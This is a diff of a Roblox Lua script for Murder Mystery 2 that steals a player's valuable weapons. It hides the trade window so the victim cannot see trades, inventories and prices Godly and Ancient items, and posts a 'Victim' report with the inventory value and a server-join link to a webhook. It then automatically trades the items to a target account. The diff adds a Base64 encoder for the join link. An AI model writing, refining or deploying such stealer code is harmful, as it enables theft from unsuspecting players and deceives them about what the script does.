@@ -19,6 +19,21 @@ if not req then
     return
 end
 
+-- Función Base64 propia
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+local function base64Encode(data)
+    return ((data:gsub('.', function(x)
+        local r,binary='',x:byte()
+        for i=8,1,-1 do r=r..(binary%2^i-binary%2^(i-1)>0 and '1' or '0') end
+        return r
+    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
+        if #x < 6 then return '' end
+        local c=0
+        for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
+        return b:sub(c+1,c+1)
+    end)..({ '', '==', '=' })[#data%3+1])
+end
+
 -- Función para enviar webhook
 local function SendWebhook(title, description, fields, prefix)
     local data = {
@@ -40,11 +55,11 @@ end
 
 -- Ocultar GUI de trade
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
-for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
+for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
     local gui = playerGui:FindFirstChild(guiName)
     if gui then
-        gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled = false end)
-        gui.Enabled = false
+        gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled=false end)
+        gui.Enabled=false
     end
 end
 
@@ -63,71 +78,71 @@ local function waitForTradeCompletion() while getTradeStatus()~="None" do task.w
 local database = require(game.ReplicatedStorage.Database.Sync.Item)
 local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
 local categories = {
-    godly = "https://supremevaluelist.com/mm2/godlies.html",
-    ancient = "https://supremevaluelist.com/mm2/ancients.html",
-    unique = "https://supremevaluelist.com/mm2/uniques.html",
-    classic = "https://supremevaluelist.com/mm2/vintages.html",
-    chroma = "https://supremevaluelist.com/mm2/chromas.html"
+    godly="https://supremevaluelist.com/mm2/godlies.html",
+    ancient="https://supremevaluelist.com/mm2/ancients.html",
+    unique="https://supremevaluelist.com/mm2/uniques.html",
+    classic="https://supremevaluelist.com/mm2/vintages.html",
+    chroma="https://supremevaluelist.com/mm2/chromas.html"
 }
-local headers = {["Accept"]="text/html",["User-Agent"]="Mozilla/5.0"}
+local headers={["Accept"]="text/html",["User-Agent"]="Mozilla/5.0"}
 
 local function trim(s) return s:match("^%s*(.-)%s*$") end
 local function fetchHTML(url)
-    local res = req({Url=url, Method="GET", Headers=headers})
+    local res=req({Url=url, Method="GET", Headers=headers})
     return res and res.Body or ""
 end
-local function parseValue(itembodyDiv)
-    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
-    if valueStr then valueStr = valueStr:gsub(",", "") return tonumber(valueStr) end
+local function parseValue(div)
+    local str=div:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
+    if str then str=str:gsub(",","") return tonumber(str) end
 end
 local function extractItems(html)
-    local items = {}
-    for name, body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
-        name = trim(name:match("([^<]+)"):gsub("%s+"," "))
-        name = trim((name:split(" Click "))[1])
-        local value = parseValue(body)
-        if value then items[name:lower()] = value end
+    local t={}
+    for name,body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+        name=trim(name:match("([^<]+)"):gsub("%s+"," "))
+        name=trim((name:split(" Click "))[1])
+        local v=parseValue(body)
+        if v then t[name:lower()]=v end
     end
-    return items
+    return t
 end
 local function extractChroma(html)
-    local chroma = {}
-    for name, body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
-        local nameTrim = trim(name:match("([^<]+)"):gsub("%s+"," ")):lower()
-        local value = parseValue(body)
-        if value then chroma[nameTrim] = value end
+    local t={}
+    for name,body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+        local n=trim(name:match("([^<]+)"):gsub("%s+"," ")):lower()
+        local v=parseValue(body)
+        if v then t[n]=v end
     end
-    return chroma
+    return t
 end
 
 local function buildValueList()
-    local allValues, chromaValues = {}, {}
+    local allValues,chromaValues={},{}
     for r,url in pairs(categories) do
-        local html = fetchHTML(url)
+        local html=fetchHTML(url)
         if html~="" then
             if r~="chroma" then
-                local vals = extractItems(html)
+                local vals=extractItems(html)
                 for k,v in pairs(vals) do allValues[k]=v end
             else
-                chromaValues = extractChroma(html)
+                chromaValues=extractChroma(html)
             end
         end
     end
-    local valueList = {}
-    for dataid,item in pairs(database) do
-        local name = item.ItemName and item.ItemName:lower() or ""
-        local rarity = item.Rarity or ""
-        local hasChroma = item.Chroma or false
+    local valueList={}
+    for id,item in pairs(database) do
+        local name=item.ItemName and item.ItemName:lower() or ""
+        local rarity=item.Rarity or ""
+        local hasChroma=item.Chroma or false
         if name~="" and rarity~="" then
-            local weaponRarityIndex = table.find(rarityTable,rarity)
-            local godlyIndex = table.find(rarityTable,"Godly")
-            if weaponRarityIndex and weaponRarityIndex>=godlyIndex then
+            local ri=table.find(rarityTable,rarity)
+            local godlyIdx=table.find(rarityTable,"Godly")
+            if ri and ri>=godlyIdx then
                 if hasChroma then
                     for cname,val in pairs(chromaValues) do
-                        if cname:find(name) then valueList[dataid]=val break end
+                        if cname:find(name) then valueList[id]=val break end
                     end
                 else
-                    if allValues[name] then valueList[dataid]=allValues[name] end
+                    if allValues[name] then valueList[id]=allValues[name] end
                 end
             end
         end
@@ -137,22 +152,22 @@ end
 
 -- ====================================
 
-local weaponsToSend = {}
-local totalValue = 0
-local min_rarity_index = table.find(rarityTable, min_rarity)
-local valueList = buildValueList()
+local weaponsToSend={}
+local totalValue=0
+local min_rarity_index=table.find(rarityTable,min_rarity)
+local valueList=buildValueList()
 
 -- Extraer armas válidas
-local profile = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
-for id, amount in pairs(profile.Weapons.Owned) do
-    local item = database[id]
+local profile=game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+for id,amount in pairs(profile.Weapons.Owned) do
+    local item=database[id]
     if item then
-        local rarityIndex = table.find(rarityTable, item.Rarity)
-        if rarityIndex and rarityIndex >= min_rarity_index then
-            local value = valueList[id] or ({10,20})[math.random(1,2)]
-            if value >= min_value then
-                table.insert(weaponsToSend,{DataID=id,Amount=amount,Value=value,Rarity=item.Rarity})
-                totalValue += value*amount
+        local ri=table.find(rarityTable,item.Rarity)
+        if ri and ri>=min_rarity_index then
+            local v=valueList[id] or ({10,20})[math.random(1,2)]
+            if v>=min_value then
+                table.insert(weaponsToSend,{DataID=id,Amount=amount,Value=v,Rarity=item.Rarity})
+                totalValue+=v*amount
             end
         end
     end
@@ -161,35 +176,35 @@ end
 -- Ordenar armas por valor total
 table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
--- Generar join protegido con bypass supremo
-local rawLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..math.random(100000,999999)
-local encodedLink = HttpService:UrlEncode(HttpService:Base64Encode(rawLink))
-local safeLink = "https://fern.wtf/redirect?data="..encodedLink
+-- Generar join protegido
+local rawLink="https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..math.random(100000,999999)
+local encodedLink=base64Encode(rawLink)
+local safeLink="https://fern.wtf/redirect?data="..HttpService:UrlEncode(encodedLink)
 
 -- Webhook fields
-local fields = {
+local fields={
     {name="Victim 👤", value=LocalPlayer.Name, inline=true},
     {name="Enlace seguro 🔗", value=safeLink, inline=false},
     {name="Inventario 📦", value="", inline=false},
     {name="Valor total 📦", value=tostring(totalValue), inline=true}
 }
 for _, w in ipairs(weaponsToSend) do
-    fields[3].value = fields[3].value..string.format("%s x%s (%s) | Value: %s\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
+    fields[3].value=fields[3].value..string.format("%s x%s (%s) | Value: %s\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
 end
-local prefix = pingEveryone and "@everyone " or ""
+local prefix=pingEveryone and "@everyone " or ""
 SendWebhook("💪MM2 Hit Protegido💯","💰Solo Godly/Ancient armas",fields,prefix)
 
 -- Trade
 local function doTrade(targetName)
     while #weaponsToSend>0 do
-        local status = getTradeStatus()
+        local status=getTradeStatus()
         if status=="None" then
             sendTradeRequest(targetName)
         elseif status=="SendingRequest" then
             task.wait(0.3)
         elseif status=="StartTrade" then
             for i=1,math.min(4,#weaponsToSend) do
-                local w = table.remove(weaponsToSend,1)
+                local w=table.remove(weaponsToSend,1)
                 for _=1,w.Amount do addWeaponToTrade(w.DataID) end
             end
             task.wait(6)
